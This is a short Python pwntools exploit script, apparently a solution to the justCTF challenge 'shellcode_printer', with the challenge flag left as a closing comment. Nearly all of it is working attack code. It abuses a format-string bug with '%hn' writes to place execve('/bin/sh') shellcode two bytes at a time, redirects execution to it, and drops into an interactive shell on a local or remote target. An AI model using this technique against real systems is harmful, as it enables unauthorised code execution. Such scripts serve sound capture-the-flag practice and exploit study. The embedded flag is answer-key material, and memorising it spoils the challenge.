#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x143f
continue
"""


exe = "././shellcode_printer"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"


def end():
    sa(b"string: ", b"\n")

def write(value):

    data = f"%{value}x%6$hn"

    sla(b"string: ", data.encode())

for i in range(0, len(shellcode), 2):
    pair = shellcode[i:i+2]
    pair = pair[::-1]
    value = int.from_bytes(pair, byteorder="big")
    write(value)

write(0xe6eb)
end()
io.interactive()
#justCTF{l0w_0n_cy4n_pl34s3_r3f1ll}
